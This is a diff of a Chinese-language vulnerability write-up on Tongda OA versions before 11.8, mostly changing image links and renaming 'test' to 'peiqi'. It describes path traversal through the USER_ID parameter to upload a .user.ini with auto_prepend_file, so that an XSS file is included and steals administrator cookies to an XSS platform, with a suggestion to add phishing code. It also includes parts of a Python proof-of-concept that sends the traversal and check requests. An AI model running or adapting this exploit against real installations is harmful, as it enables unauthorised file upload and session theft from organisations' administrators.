@@ -65,7 +65,7 @@ if ($PHOTO_NAME0 != "") {
 }
 ```
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-30.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image/tongdaoa-30.png)
 
 在这里参数 **$USER_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
 
@@ -74,7 +74,7 @@ if ($PHOTO_NAME0 != "") {
 内容为
 
 ```
-auto_prepend_file=test.log
+auto_prepend_file=peiqi.log
 ```
 
 我们想要最大化利用可以上传在**首页或者管理员** 界面，利用自定义弹窗来渗透
@@ -119,21 +119,21 @@ auto_prepend_file=peiqi.log
 
 这里拼接后上传就变成了 **.user.ini**
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-31.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-31.png)
 
 这里再上传 XSS文件 **peiqi.log** 被包含进去
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-32.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-32.png)
 
 上传后每次管理员登录后都会带着Cookie请求一次XSS平台
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-33.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-33.png)
 
 钓鱼什么的代码写在peiqi.log文件里就好啦
 
 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-34.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-34.png)
 
 ```php
 if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {
@@ -146,11 +146,11 @@ if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") ===
 
 路径中必须要包含  **webroot 和 attachment** 才可以上传
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-35.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-35.png)
 
  这里XSS的利用点有4个文件夹，其中最有几率XSS的为**存储目录管理的文件夹**
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-36.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-36.png)
 
 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie
 
@@ -175,6 +175,8 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 def title():
     print('+------------------------------------------')
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
+    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
+    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
     print('+  \033[34mVersion: 通达OA < V11.8                                             \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
     print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
@@ -209,7 +211,7 @@ def POC_1(target_url, Cookie):
         print("\033[31m[x] 请求失败 \033[0m", e)
 
 def POC_2(target_url, Cookie):
-    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/test"
+    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -224,19 +226,19 @@ def POC_2(target_url, Cookie):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
-        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \033[0m".format(target_url))
+        print("\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
         if "档案已保存" in response.text and response.status_code == 200:
-            print("\033[32m[o] 目标 {} 成功上传 test.log 文件, \033[0m".format(target_url))
+            print("\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \033[0m".format(target_url))
             POC_3(target_url, Cookie)
         else:
-            print("\033[31m[x] 目标 {} 上传 test.log 文件失败\033[0m".format(target_url))
+            print("\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\033[0m".format(target_url))
             sys.exit(0)
 
     except Exception as e:
         print("\033[31m[x] 请求失败 \033[0m", e)
 
 def POC_3(target_url, Cookie):
-    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test"
+    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
         "Cookie":  Cookie,
@@ -244,11 +246,11 @@ def POC_3(target_url, Cookie):
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
-        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?test=test \033[0m".format(target_url))
-        if "test_Wiki" in response.text and response.status_code == 200:
-            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))
+        print("\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))
+        if "PeiQi_Wiki" in response.text and response.status_code == 200:
+            print("\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \033[0m".format(target_url))
         else:
-            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\033[0m".format(target_url))
+            print("\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\033[0m".format(target_url))
             sys.exit(0)
     except Exception as e:
         print("\033[31m[x] 请求失败 \033[0m", e)
@@ -261,7 +263,7 @@ if __name__ == '__main__':
 
 ```
 
-![](http://wikioss.peiqi.tech/vuln/tongdaoa-37.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
+![](image\tongdaoa-37.png)
 
 ## 参考文章
 
